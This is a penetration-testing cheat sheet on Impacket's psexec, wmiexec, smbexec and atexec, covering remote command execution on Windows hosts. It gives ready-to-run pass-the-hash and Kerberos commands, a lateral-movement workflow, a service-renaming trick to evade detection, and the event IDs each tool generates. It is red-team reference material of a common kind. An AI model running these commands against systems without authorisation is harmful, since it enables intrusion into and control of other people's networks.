# impacket-psexec / wmiexec / atexec / smbexec

**Tags:** `#impacket` `#psexec` `#wmiexec` `#lateral` `#remoteexec` `#passthehash` `#windows`

Impacket's remote execution tools — run commands on Windows targets from Kali via SMB/WMI/RPC. All four support password and PTH auth. Each uses a different execution mechanism with different noise levels, artifact profiles, and privilege requirements.

**Source:** Part of Impacket — pre-installed on Kali

| Tool | Protocol | Mechanism | Artifacts | Needs Admin |
|---|---|---|---|---|
| `psexec.py` | SMB | Creates PSEXEC service, drops binary | Service install, binary on disk | Yes |
| `wmiexec.py` | WMI (135) | WMI process creation | WMI event logs | Yes |
| `atexec.py` | SMB (Task Scheduler) | Scheduled task | Task created/deleted | Yes |
| `smbexec.py` | SMB | Service + cmd.exe | Service, no binary on disk | Yes |

> [!note] **Choosing the right tool** — `wmiexec` is the quietest (no service install, no binary drop). `psexec` is noisiest but most reliable. `smbexec` is a middle ground. Use `wmiexec` by default; fall back to `psexec` if WMI is blocked.

---

## psexec.py

Uploads a binary to the target's ADMIN$ share, installs a Windows service, gets a SYSTEM shell.

```bash
# Password auth
psexec.py DOMAIN/Administrator:Password@192.168.1.10

# PTH
psexec.py -hashes :NTLMhash DOMAIN/Administrator@192.168.1.10

# Local account
psexec.py Administrator:Password@192.168.1.10 -no-pass
psexec.py -hashes :NTLMhash ./Administrator@192.168.1.10

# Run single command
psexec.py DOMAIN/Administrator:Password@192.168.1.10 whoami

# Kerberos
KRB5CCNAME=ticket.ccache psexec.py -k DOMAIN/Administrator@target.domain.local -no-pass

# Custom service name (bypass name-based detection)
psexec.py DOMAIN/Administrator:Password@192.168.1.10 -service-name svchost32
```

---

## wmiexec.py

Executes commands via WMI — no service install, no binary on disk. Output returned via SMB share.

```bash
# Password auth
wmiexec.py DOMAIN/Administrator:Password@192.168.1.10

# PTH
wmiexec.py -hashes :NTLMhash DOMAIN/Administrator@192.168.1.10

# Run single command (no interactive shell)
wmiexec.py DOMAIN/Administrator:Password@192.168.1.10 whoami
wmiexec.py DOMAIN/Administrator:Password@192.168.1.10 "ipconfig /all"

# Kerberos
KRB5CCNAME=ticket.ccache wmiexec.py -k DOMAIN/Administrator@target.domain.local -no-pass

# Semi-interactive shell
wmiexec.py DOMAIN/Administrator:Password@192.168.1.10
# Type commands — output returned after each
```

---

## smbexec.py

Creates a service that runs cmd.exe — no binary dropped to disk (unlike psexec).

```bash
# Password auth
smbexec.py DOMAIN/Administrator:Password@192.168.1.10

# PTH
smbexec.py -hashes :NTLMhash DOMAIN/Administrator@192.168.1.10

# Single command
smbexec.py DOMAIN/Administrator:Password@192.168.1.10 whoami
```

---

## atexec.py

Schedules a task, runs it immediately, retrieves output, deletes the task.

```bash
# Run command via scheduled task
atexec.py DOMAIN/Administrator:Password@192.168.1.10 whoami
atexec.py -hashes :NTLMhash DOMAIN/Administrator@192.168.1.10 "net user"

# Kerberos
KRB5CCNAME=ticket.ccache atexec.py -k DOMAIN/Administrator@target.domain.local whoami -no-pass
```

---

## Common Workflow

```bash
# 1. Test access with NetExec first
netexec smb 192.168.1.10 -u Administrator -H :NTLMhash

# 2. Get a shell
wmiexec.py -hashes :NTLMhash DOMAIN/Administrator@192.168.1.10

# 3. If WMI blocked, fall back
psexec.py -hashes :NTLMhash DOMAIN/Administrator@192.168.1.10

# 4. Kerberos (use ticket from Rubeus/getTGT)
KRB5CCNAME=admin.ccache wmiexec.py -k -no-pass DOMAIN/Administrator@target.domain.local
```

---

## OPSEC Notes

- **psexec**: Creates a Windows service (Event ID **7045**) and drops a binary to `ADMIN$` — highly detected
- **wmiexec**: WMI process creation logged (Event ID **4688** if process auditing enabled, WMI activity logs). Output file written to `ADMIN$\__<timestamp>` — auto-deleted
- **smbexec**: Service creation (Event ID **7045**) but no binary on disk — moderate detection
- **atexec**: Scheduled task creation/deletion (Event ID **4698**/**4699**) — moderate detection
- All generate Event ID **4624** (logon type 3) on the target

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
